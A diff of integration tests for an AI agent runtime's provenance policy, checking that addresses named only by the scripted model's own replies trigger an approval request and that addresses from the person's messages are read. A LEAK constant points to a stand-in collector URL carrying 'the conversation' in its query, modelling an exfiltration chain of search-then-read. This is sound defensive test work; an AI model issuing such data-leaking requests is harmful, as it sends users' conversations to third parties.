@@ -4,6 +4,11 @@ Phase H10 (the external review of 2026-11-12, annex A): of a stored search, only
 hit's `url` vouches for an address. The model's own `query` doesn't, nor do titles and
 snippets a page can write. The legitimate cases keep passing: a result's address, with
 or without a tracking parameter the model dropped, and an address from the person.
+
+Of the person's side, only their words count too: the `message` of the run's input and
+the `text` of their messages in the chat. With the scripted test model the run's input
+also holds the model's replies (`script`), and a replay of the review's chain through a
+whole scripted turn read the page unasked until that field stopped vouching.
 """
 
 from __future__ import annotations
@@ -16,11 +21,16 @@ import pytest
 from psycopg.types.json import Jsonb
 from pydantic import ConfigDict
 
+from agent_runtime.config import Settings
 from agent_runtime.db import Pool
 from agent_runtime.fencing import Fence
+from agent_runtime.graphs import default_registry
 from agent_runtime.runs.events import EventType as E
+from agent_runtime.runs.executor import RunExecutor
+from agent_runtime.runs.service import RunService
 from agent_runtime.runs.state import RunStatus
 from agent_runtime.runs.store import RunRepository
+from agent_runtime.sessions.service import SessionService
 from agent_runtime.tools.pipeline import Grant, ToolCall, ToolPipeline, ToolResult, ToolRunContext
 from agent_runtime.tools.policy import ProvenancePolicy, RiskClassPolicy
 from agent_runtime.tools.spec import ToolArgs, ToolContext, ToolRegistry
@@ -28,6 +38,7 @@ from agent_runtime.web import tools as web_tools
 from agent_runtime.web.search import Hits
 
 pytestmark = pytest.mark.integration
+GRAPHS = default_registry()
 GIVEN = "https://docs.example.com/guide"
 FOUND = "https://found.example/article"
 LEAK = "https://collect.evil.example/log?d=the%20conversation"
@@ -89,17 +100,34 @@ class Reader:
         return (await self.call(fence, pool, "read_webpage", {"url": url}, index)).status
 
 
-@pytest.fixture
-async def fence(pool: Pool) -> Fence:
+async def running(pool: Pool, run_id: uuid.UUID) -> Fence:
+    """The run, taken by a worker: what a tool call of it is fenced with."""
     async with pool.connection() as conn:
         repo = RunRepository(conn)
-        run = await repo.create(
-            graph_name="assistant", input={"message": f"Summarise {GIVEN} for me"}
-        )
-        lease = await repo.acquire_lease(run.id, "prov:1", ttl_s=60)
+        lease = await repo.acquire_lease(run_id, "prov:1", ttl_s=60)
         assert lease is not None
-        await repo.transition(run.id, RunStatus.RUNNING, event=E.RUN_STARTED, fence=lease.fence)
+        await repo.transition(run_id, RunStatus.RUNNING, event=E.RUN_STARTED, fence=lease.fence)
     return lease.fence
+
+
+async def started(pool: Pool, input: dict[str, Any]) -> Fence:
+    async with pool.connection() as conn:
+        run = await RunRepository(conn).create(graph_name="assistant", input=input)
+    return await running(pool, run.id)
+
+
+@pytest.fixture
+async def fence(pool: Pool) -> Fence:
+    return await started(pool, {"message": f"Summarise {GIVEN} for me"})
+
+
+def says(*calls: tuple[str, dict[str, Any]]) -> list[dict[str, Any]]:
+    """The scripted model's replies: one tool call per turn, then a closing word."""
+    turns: list[dict[str, Any]] = [{"tool_calls": [{"name": n, "args": a}]} for n, a in calls]
+    return [*turns, {"content": "Done."}]
+
+
+SEARCH_THEN_READ = says(("web_search", {"query": LEAK}), ("read_webpage", {"url": LEAK}))
 
 
 async def searched(pool: Pool, fence: Fence, result: dict[str, Any]) -> None:
@@ -228,6 +256,72 @@ async def test_the_reviewers_replay_search_then_read_asks(
         )
         [row] = await cur.fetchall()
     assert row["result"]["query"] == LEAK and row["result"]["results"] == []
+
+
+async def test_the_scripted_models_replies_in_the_runs_input_vouch_for_nothing(pool: Pool) -> None:
+    """A turn of the scripted test model stores its replies beside the person's message
+    (`input.script`, `input.subagent_scripts`). They are the model's words: the address
+    they name asks, and the one in the person's message is still read."""
+    fence = await started(
+        pool,
+        {
+            "message": f"Summarise {GIVEN} for me",
+            "script": SEARCH_THEN_READ,
+            "subagent_scripts": {"researcher": says(("read_webpage", {"url": LEAK}))},
+        },
+    )
+    reader = Reader()
+    assert await reader.read_page(fence, pool, LEAK, 0) == "error"  # the person said no
+    assert reader.read[LEAK] == 0
+    [asked] = reader.asked
+    assert asked["tool"] == "read_webpage" and asked["args"]["url"] == LEAK
+    assert await reader.read_page(fence, pool, GIVEN, 1) == "success"  # their own words
+
+
+async def test_a_whole_scripted_turn_that_searches_then_reads_stops_for_approval(
+    pool: Pool, test_settings: Settings, checkpoint_tables: None, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """The review's chain as a person would replay it on a fresh install: a chat with
+    the built-in agent, the scripted model, the real executor. Nothing is read."""
+    monkeypatch.setattr(web_tools, "_settings_service", lambda _pool: NothingFound())
+    sessions = SessionService(pool, test_settings, GRAPHS, RunService(pool, test_settings, GRAPHS))
+    chat = await sessions.create("chat")
+    sent = await sessions.send(chat.id, "What's new today?", script=SEARCH_THEN_READ)
+    run = await RunExecutor(pool, test_settings, GRAPHS).execute(sent.run.id)
+    assert run.status is RunStatus.WAITING_APPROVAL
+    async with pool.connection() as conn:
+        cur = await conn.execute(
+            "SELECT tool, args, status FROM run_approvals WHERE run_id = %s", (run.id,)
+        )
+        [asked] = await cur.fetchall()
+        cur = await conn.execute(
+            "SELECT tool, status FROM tool_invocations WHERE run_id = %s", (run.id,)
+        )
+        ran = [(r["tool"], r["status"]) for r in await cur.fetchall()]
+    assert (asked["tool"], asked["args"], asked["status"]) == (
+        "read_webpage", {"url": LEAK}, "pending"
+    )  # fmt: skip
+    assert ("web_search", "done") in ran  # control: the search ran, its query is stored
+    assert ("read_webpage", "done") not in ran
+
+
+async def test_an_address_from_an_earlier_message_of_the_chat_is_read_without_asking(
+    pool: Pool, test_settings: Settings, checkpoint_tables: None
+) -> None:
+    """The person gave the address two messages ago: it's theirs for the whole chat.
+    What the model was scripted to say in either turn still vouches for nothing."""
+    sessions = SessionService(pool, test_settings, GRAPHS, RunService(pool, test_settings, GRAPHS))
+    chat = await sessions.create("chat")
+    first = await sessions.send(chat.id, f"Keep {GIVEN} in mind", script=[{"content": LEAK}])
+    ended = await RunExecutor(pool, test_settings, GRAPHS).execute(first.run.id)
+    assert ended.status is RunStatus.COMPLETED
+    second = await sessions.send(chat.id, "Now read it", script=SEARCH_THEN_READ)
+    fence = await running(pool, second.run.id)
+    reader = Reader()
+    assert await reader.read_page(fence, pool, GIVEN, 0) == "success"
+    assert reader.asked == []
+    assert await reader.read_page(fence, pool, LEAK, 1) == "error"
+    assert reader.read[LEAK] == 0 and len(reader.asked) == 1
 
 
 async def test_a_site_you_allowed_is_read_without_asking(pool: Pool, fence: Fence) -> None:
